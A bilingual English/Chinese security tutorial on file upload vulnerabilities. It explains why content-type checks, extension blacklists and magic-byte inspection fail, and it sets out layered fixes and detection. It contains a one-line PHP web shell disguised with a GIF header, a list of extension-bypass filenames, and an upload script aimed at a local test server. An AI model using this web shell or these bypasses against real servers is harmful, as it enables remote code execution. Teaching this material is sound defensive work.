---
id: upload-fundamentals
title_en: "File Upload, Part 1 — Who Allows It and Who Runs It"
title_zh: "文件上传（一）：谁允许它，谁执行它"
summary_en: An upload control asks a question about a string, while the server answers a question about configuration and filesystem behaviour. This entry separates the three decisions in the chain, shows with a reproducible experiment that each common check fails on its own, and states the combination that actually works.
summary_zh: 上传校验问的是一个关于字符串的问题，而服务器回答的是一个关于配置与文件系统行为的问题。这一篇把判定链上的三个决定分开，用一个可复现实验展示常见的每道检查如何各自失效，然后给出真正有效的组合。
tags: [web, file-upload, cwe-434, mime-type, extension]
tools: [Burp Suite, curl, python3, exiftool]
attck: [T1190, T1105]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### The split that defines the whole vulnerability class

File upload is not one check that is sometimes wrong. It is a chain of **three decisions**, made by three different components, about the same file:

| Decision | Who makes it | What it is really based on |
|---|---|---|
| Is this file allowed in? | The application | A **string** — usually the filename or the declared content type |
| Where does it land? | The application | A path built from something, often the client's filename |
| Will it be executed when requested? | The **web server and runtime** | Extension-to-handler mapping, directory configuration, filesystem rules |

The vulnerability lives in the gap between the first and the third. The application approves based on a **string**, and execution is decided by **configuration operating on a path**. Nothing about a filename tells you whether a server will run it, and nothing about a handler mapping tells you whether the application approved it.

That is the same structure as every other entry in this series — an injection is a checker and an interpreter disagreeing about the same bytes — with the twist that here the interpreter is the file server, and the "language" is the server's configuration.

It is also worth stating plainly what the attacker wants, because it is not always code execution:

- **Execution on the server** — the classic, and what most of this entry is about.
- **Overwriting a file that matters** — configuration, templates, keys, another user's avatar.
- **Landing somewhere outside the intended directory** — the subject of the next entry.
- **Using the storage as a public host** — content served from your origin, with your certificate and reputation.

### The checks people write, and why each fails alone

#### Declared content type

The `Content-Type` of a multipart part is **supplied by the client**. It is not derived from the bytes; it is a header the sender chose.

```
Content-Disposition: form-data; name="avatar"; filename="shell.jpg"
Content-Type: image/jpeg          <- chosen by the sender, not measured
```

A server that checks it is checking an assertion, not a property. Changing one string in the request satisfies the check while the file remains whatever it is.

#### Extension blacklist

Two independent failure modes, both of which show up in practice:

**It is case-sensitive more often than the filesystem is.** A list containing `.php` does not match `.PHP`, and on Windows, and on many handler configurations, `.PHP` is the same file.

**The list is never complete.** For a PHP stack alone the set of extensions that may reach the handler includes `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.pht`, `.phar`, `.inc`, `.shtml`, and whatever the local `AddHandler` or `location` block says. A blacklist enumerates a configuration that someone else can change.

#### Extension allowlist

This is the right shape, and it is still defeated by the same parsing differences the language entries described, because the check and the handler may read **different tokens** from the same filename:

| Filename | What a "last extension" check sees | What a handler may act on |
|---|---|---|
| `shell.php.jpg` | `.jpg` | `.jpg`, or `.php` if the handler matches anywhere in the name |
| `shell.jpg.php` | `.php` | `.php` |
| `shell.PHP` | `.PHP` | `.php` on a case-insensitive handler |
| `shell.php.` | `.` | `.php` on Windows, where trailing dots are stripped |
| `shell.php ` | ` ` | `.php` on Windows, where trailing spaces are stripped |
| `shell.php::$DATA` | `::$DATA` | the file `shell.php` |
| `shell.php%00.jpg` | `.jpg` | the file `shell.php` in old PHP versions with NUL truncation |
| `shell.tar.gz` | `.gz` | whichever of the two the configuration cares about |

An allowlist of **exact, final, lowercase** extensions is a real control, and it only works if the token being compared is the token the server will use — which means it must be applied to a **canonicalised** filename, after the same normalisation the filesystem will do.

#### Content inspection

Checking that the bytes look like an image is stronger than checking a string, and it is still defeated when the file merely has to **start** with the right bytes:

```
GIF89a<?php system($_GET['c']); ?>
```

That is a valid GIF header followed by PHP. It satisfies "starts with GIF89a" and is executed as PHP by a server that maps the extension to the interpreter. Content inspection raises the cost; it does not change which component decides execution.

### A reproducible experiment

The two checks below are written the way they are usually written. The point of running them is that both failures become measurable rather than theoretical.

```python
import os

# check 1: an extension blacklist, compared case-sensitively
BANNED_EXT = {'.php', '.phtml', '.php3', '.php4', '.php5', '.phar'}

# check 2: the declared MIME type must look like an image
def image_content_type_ok(ct: str) -> bool:
    return ct.startswith('image/')

def allowed(filename: str, content_type: str) -> bool:
    ext = os.path.splitext(filename)[1]          # only the last extension
    if ext in BANNED_EXT:                        # case-sensitive membership test
        return False
    return image_content_type_ok(content_type)
```

Send multipart requests with a PHP payload — the bytes begin with a GIF header so that content inspection, if any, also passes:

```python
import requests
BASE = 'http://127.0.0.1:8000'
GIF = b'GIF89a\x01\x00\x01\x00\x00\x00\x00;'
PAYLOAD = GIF + b'<?php echo "pwn"; ?>'

def upload(filename, ctype):
    r = requests.post(BASE + '/upload',
                      files={'avatar': (filename, PAYLOAD, ctype)}, timeout=10)
    return r.status_code
```

The results, with the content type held at `image/jpeg`:

| Filename | Result | Why |
|---|---|---|
| `shell.php` | rejected | On the list, in the case it was written in |
| `shell.PHP` | **accepted** | The comparison is case-sensitive; the filesystem and handler are not |
| `shell.phtml` | rejected | On the list |
| `shell.PHTML` | **accepted** | Same case problem |
| `shell.pht` | **accepted** | Not on the list at all |
| `shell.phar` | **accepted** | Not on the list |
| `shell.inc` | **accepted** | Not on the list |
| `shell.php7` | **accepted** | Not on the list |
| `shell.shtml` | **accepted** | Not on the list |
| `a.php.jpg` | accepted | The check takes the **last** extension |
| `a.jpg.PHP` | **accepted** | Last extension, and the case problem together |

And with the filename held at `shell.jpg`:

| Declared `Content-Type` | Result |
|---|---|
| `image/jpeg`, `image/png`, `image/gif` | accepted |
| `text/plain` | rejected |
| `application/x-php` | rejected |
| `application/octet-stream` | rejected |
| (absent) | rejected |

Two conclusions, both generalisable:

**The content-type check is a check on the sender's claim.** It rejects an honest sender and accepts a dishonest one, which is the definition of a control that measures nothing.

**The extension check fails in two independent ways at once.** Case sensitivity is a bug in the comparison; the incomplete list is a bug in the threat model. Fixing either one leaves the other.

### Why the fix is a combination, not a better check

Every attempt to make the check cleverer is an attempt to answer, from a string, a question that only the serving configuration can answer. The working shape is to stop relying on that answer:

1. **Allowlist exact extensions, compared lowercase, on a canonicalised name.** Take the filename apart the same way the OS will — strip trailing dots and spaces, resolve short names, handle alternate data streams — and compare the **result**.
2. **Do not use the client's filename for storage.** Generate a name. Keep the original as metadata if it is needed for display, and render it escaped. This removes traversal, overwriting and extension confusion in one step, because the stored name is not attacker-influenced.
3. **Store where nothing executes.** Outside the web root, or in a directory the server is configured not to run scripts from. If the file never reaches an interpreter, the extension question stops mattering — this is the upload equivalent of parameterisation, because it removes the file's ability to be treated as code.
4. **Serve as data.** When the file must be downloadable, serve it with an explicit content type and `Content-Disposition: attachment`, and consider a separate origin for user content.
5. **Keep the process unable to do damage.** A web user that cannot write into the code directories, cannot execute what it writes, and owns only its upload directory turns a bypass into a much smaller incident.

The pattern under all five: **separate the thing that is data from the thing that is code, and make the separation structural rather than verificational.**

### Parsing differences worth knowing

These come from the same list as the language entries, applied to filenames:

| Difference | Effect |
|---|---|
| Trailing dots and spaces | Stripped by Windows; the check sees a different name than the filesystem creates |
| Case-insensitivity | `.PHP` and `.php` are one file on Windows and on many handlers |
| Alternate data streams | `file.php::$DATA` addresses the default stream of `file.php` |
| Multiple extensions | The check and the handler may take different tokens |
| Alternative extensions | `.phtml`, `.pht`, `.phar`, `.inc`, `.shtml` and versioned variants may all map to the interpreter |
| NUL truncation | Removed in modern runtimes; historically the check and the file API stopped at different points |
| Length limits | A name truncated by a filesystem limit can end up with an extension nobody checked |
| Double URL decoding | A filename arriving percent-encoded and decoded twice reaches a different string than the check saw |

### Detection and mitigation

- **Log the four names.** The client-supplied filename, the canonicalised name, the name actually written to disk, and the path served. On a Windows host those can all differ, and the bug is between two of them — no single one of them shows it.
- **Alert on filenames that look like probes rather than pictures.** Multiple extensions, mixed-case extensions, trailing dots or spaces, `::`, an extension outside the small set the application expects, and control characters. This is the same signal shape as the payload-building patterns in the XSS entries: someone reasoning about your check rather than about your application.
- **Alert on the mismatch, not the extension.** A request whose declared content type is `image/jpeg` while the body contains `<?php`, `<%`, `${` or a script tag is a mismatch between a claim and the bytes, and it is cheap to detect. So is an upload where the stored file's extension differs from the allowlist but the request still succeeded.
- **Review for these specific patterns in code**: a `Content-Type` check, an extension blacklist, `os.path.join(upload_dir, client_filename)`, an archive extracted without path validation, and a template or config directory that shares a parent with the upload directory.
- **Test the four questions rather than one payload**: does the check read the same token the server acts on; does a rename happen; can the file land outside the intended directory; is the storage location executable. Each has a different answer and a different fix.
- **And apply the enablement test.** Upload a file with a benign extension into the same directory and request it. If the server returns it as text, extension mapping is not reaching that directory and the risk profile is different from a server that executes it. That single request tells you more than any payload list.

<!-- lang:zh -->
### 定义这一整类漏洞的那个分裂

文件上传不是"某一道检查有时写错"。它是关于同一个文件的**三个决定**，由三个不同组件做出：

| 决定 | 谁做 | 它真正依据的是什么 |
|---|---|---|
| 这个文件能不能进来 | 应用 | 一个**字符串** —— 通常是文件名或声明的类型 |
| 它落在哪里 | 应用 | 一条由某个东西拼出来的路径，常常是客户端的文件名 |
| 被请求时它会不会被执行 | **Web 服务器与运行时** | 扩展名到处理器的映射、目录配置、文件系统规则 |

漏洞住在第一个和第三个之间的缝里。应用基于**字符串**放行，而执行由**作用在路径上的配置**决定。文件名本身不告诉你服务器会不会运行它，处理器映射也不告诉你应用有没有放行。

这和其他每一篇是同一个结构 —— 注入是检查者与解释者对同一串字节意见不一 —— 只是这里的解释器是文件服务器，而"语言"是服务器的配置。

也值得把攻击者想要什么说清楚，因为它不总是代码执行：

- **在服务器上执行** —— 经典目标，这一篇大半在讲它。
- **覆盖有分量的文件** —— 配置、模板、密钥、别人的头像。
- **落到预期目录之外** —— 下一篇的主题。
- **把存储当成公开托管** —— 用你的源、你的证书、你的信誉来提供内容。

### 人们写的那些检查，以及为什么每一道单独都会失效

#### 声明的内容类型

multipart 分片的 `Content-Type` 是**客户端提供的**。它不是从字节里测出来的，是发送方选的一个头。

```
Content-Disposition: form-data; name="avatar"; filename="shell.jpg"
Content-Type: image/jpeg          <- 发送方选的，不是测出来的
```

检查它的服务器，检查的是一个**断言**，不是一个性质。改请求里的一个字符串就满足了这道检查，而文件仍然是它原本的东西。

#### 扩展名黑名单

两个彼此独立的失效模式，实践中两个都见得到：

**它常常区分大小写，而文件系统不区分。** 一份含 `.php` 的清单匹配不上 `.PHP`，而在 Windows 上、以及很多处理器配置下，`.PHP` 就是同一个文件。

**清单永远不全。** 单就一个 PHP 技术栈，可能到达处理器的扩展名集合包括 `.php`、`.php3`、`.php4`、`.php5`、`.php7`、`.phtml`、`.pht`、`.phar`、`.inc`、`.shtml`，再加上本地 `AddHandler` 或 `location` 块说了什么。黑名单在枚举一份**别人可以改**的配置。

#### 扩展名白名单

这是形状正确的做法，而它仍然被语言那几篇描述过的同一类解析差异打败，因为检查和处理器可能从同一个文件名里读到**不同的记号**：

| 文件名 | "取最后一个后缀"的检查看到 | 处理器可能据以行动的是 |
|---|---|---|
| `shell.php.jpg` | `.jpg` | `.jpg`；若处理器匹配名字任意位置则是 `.php` |
| `shell.jpg.php` | `.php` | `.php` |
| `shell.PHP` | `.PHP` | 不区分大小写的处理器上是 `.php` |
| `shell.php.` | `.` | Windows 上（末尾点被剥掉）是 `.php` |
| `shell.php ` | ` ` | Windows 上（末尾空格被剥掉）是 `.php` |
| `shell.php::$DATA` | `::$DATA` | 文件 `shell.php` |
| `shell.php%00.jpg` | `.jpg` | 老版本 PHP（NUL 截断）里是文件 `shell.php` |
| `shell.tar.gz` | `.gz` | 配置关心的那两个中的某一个 |

一份**精确、取最后、小写**的扩展名白名单是一项真实的控制，而它只有在"被比较的记号就是服务器将要使用的记号"时才成立 —— 也就是说，它必须作用在**规范化之后**的文件名上，且用的是文件系统将要做的同一套规范化。

#### 内容检测

检查字节看起来像不像图片，比检查字符串强，而当文件只需要**以正确的字节开头**时，它依然会被打败：

```
GIF89a<?php system($_GET['c']); ?>
```

那是一个合法的 GIF 头，后面跟着 PHP。它满足"以 GIF89a 开头"，而一个把扩展名映射到解释器的服务器会把它当 PHP 执行。内容检测提高了成本；它没有改变"由哪个组件决定执行"。

### 一个可复现的实验

下面两道检查就是人们通常的写法。跑一遍的意义在于，两个失效都变得可测量，而不是停在理论上。

```python
import os

# 检查一：扩展名黑名单，按大小写敏感比较
BANNED_EXT = {'.php', '.phtml', '.php3', '.php4', '.php5', '.phar'}

# 检查二：声明的 MIME 类型必须看起来像图片
def image_content_type_ok(ct: str) -> bool:
    return ct.startswith('image/')

def allowed(filename: str, content_type: str) -> bool:
    ext = os.path.splitext(filename)[1]          # 只取最后一个扩展名
    if ext in BANNED_EXT:                        # 大小写敏感的成员测试
        return False
    return image_content_type_ok(content_type)
```

用 multipart 请求发一个 PHP 载荷 —— 字节以 GIF 头开头，这样万一还有内容检测也能过：

```python
import requests
BASE = 'http://127.0.0.1:8000'
GIF = b'GIF89a\x01\x00\x01\x00\x00\x00\x00;'
PAYLOAD = GIF + b'<?php echo "pwn"; ?>'

def upload(filename, ctype):
    r = requests.post(BASE + '/upload',
                      files={'avatar': (filename, PAYLOAD, ctype)}, timeout=10)
    return r.status_code
```

内容类型固定为 `image/jpeg` 时的结果：

| 文件名 | 结果 | 为什么 |
|---|---|---|
| `shell.php` | 拒绝 | 在清单上，而且是它被写下的那个大小写 |
| `shell.PHP` | **通过** | 比较区分大小写；文件系统与处理器不区分 |
| `shell.phtml` | 拒绝 | 在清单上 |
| `shell.PHTML` | **通过** | 同样的大小写问题 |
| `shell.pht` | **通过** | 根本不在清单上 |
| `shell.phar` | **通过** | 不在清单上 |
| `shell.inc` | **通过** | 不在清单上 |
| `shell.php7` | **通过** | 不在清单上 |
| `shell.shtml` | **通过** | 不在清单上 |
| `a.php.jpg` | 通过 | 检查取的是**最后一个**扩展名 |
| `a.jpg.PHP` | **通过** | 最后一个扩展名，加上大小写问题 |

文件名固定为 `shell.jpg` 时：

| 声明的 `Content-Type` | 结果 |
|---|---|
| `image/jpeg`、`image/png`、`image/gif` | 通过 |
| `text/plain` | 拒绝 |
| `application/x-php` | 拒绝 |
| `application/octet-stream` | 拒绝 |
| （缺失） | 拒绝 |

两个结论，都能推广：

**内容类型检查是在检查发送方的声明。** 它拒绝诚实的人、放行不诚实的人 —— 这就是"什么都没测的控制"的定义。

**扩展名检查同时以两种彼此独立的方式失效。** 大小写敏感是比较函数的 bug；清单不全是对威胁建模的 bug。修好任意一个，另一个还在。

### 为什么修法是一个组合，而不是一道更聪明的检查

每一次"把检查写得更聪明"的尝试，都是在试图用一个字符串回答一个只有**提供服务的配置**才能回答的问题。有效的形状是停止依赖那个答案：

1. **白名单精确扩展名，按小写比较，作用在规范化后的名字上。** 用操作系统会用的同一套方式拆解文件名 —— 剥掉末尾的点与空格、解析短名、处理备用数据流 —— 然后比较**结果**。
2. **不要用客户端的文件名来存储。** 生成一个名字。若需要原文件名展示，就把它当元数据保留，并转义后再渲染。这一步同时移除了路径穿越、覆盖和扩展名混淆，因为存下来的名字不再受攻击者影响。
3. **存到不会执行的地方。** Web 根之外，或者服务器被配置为不从其中运行脚本的目录。如果文件永远到不了解释器，扩展名这个问题就不再要紧 —— 这是上传这一类的"参数化"对应物，因为它移除了文件**被当作代码**的能力。
4. **按数据来提供。** 当文件必须可下载时，用显式的内容类型与 `Content-Disposition: attachment` 提供，并考虑把用户内容放到独立的源上。
5. **让进程没有能力造成破坏。** 一个不能往代码目录写、不能执行自己写下的东西、只拥有自己上传目录的 Web 用户，会把一次绕过变成一起小得多的事件。

这五条底下是同一个模式：**把"是数据的东西"和"是代码的东西"分开，而且让这个分离是结构性的，而不是靠校验维持的。**

### 值得知道的解析差异

这些和语言那几篇是同一张清单，用在文件名上：

| 差异 | 效果 |
|---|---|
| 末尾的点与空格 | Windows 会剥掉；检查看到的和文件系统创建的不是同一个名字 |
| 大小写不敏感 | Windows 与很多处理器上 `.PHP` 和 `.php` 是同一个文件 |
| 备用数据流 | `file.php::$DATA` 指向 `file.php` 的默认数据流 |
| 多扩展名 | 检查与处理器可能取不同的记号 |
| 备用扩展名 | `.phtml`、`.pht`、`.phar`、`.inc`、`.shtml` 及版本化变体都可能映射到解释器 |
| NUL 截断 | 现代运行时已移除；历史上检查与文件 API 在不同位置停下 |
| 长度限制 | 被文件系统限制截断的名字，可能留下一个没人检查过的扩展名 |
| 二次 URL 解码 | 以百分号编码到达、被解码两次的文件名，得到的串与检查看到的不同 |

### 检测与缓解

- **记下四个名字。** 客户端提供的文件名、规范化后的名字、真正写进磁盘的名字、以及被提供服务的路径。在 Windows 主机上这四个可以全都不一样，而 bug 就在其中两个之间 —— 单独看哪一个都看不出来。
- **对"像探针而不是图片"的文件名告警。** 多扩展名、大小写混杂的扩展名、末尾的点或空格、`::`、落在应用预期集合之外的扩展名、以及控制字符。这和 XSS 那几篇里"构造 payload"的形状是同一个信号：有人在**推理你的检查**，而不是推理你的应用。
- **对不匹配告警，而不是对扩展名告警。** 一个声明 `image/jpeg` 而正文里含 `<?php`、`<%`、`${` 或脚本标签的请求，是"声明与字节不一致"，检测起来很便宜。同样便宜的是：某个上传的存储扩展名不在白名单内，而请求却成功了。
- **在代码里专门找这几种写法**：`Content-Type` 检查、扩展名黑名单、`os.path.join(upload_dir, client_filename)`、解压时不做路径校验、以及"模板或配置目录与上传目录共用一个父目录"。
- **测那四个问题，而不是测一个 payload**：检查读的记号是否就是服务器据以行动的记号；有没有重命名；文件能否落到预期目录之外；存储位置是否可执行。每一个都有不同答案和不同修法。
- **而且做那个"可执行性测试"。** 往同一个目录上传一个无害扩展名的文件，再请求它。如果服务器把它当文本返回，说明扩展名映射到不了那个目录，风险画像与"会执行它的服务器"不同。那**一个**请求告诉你的，比任何 payload 清单都多。
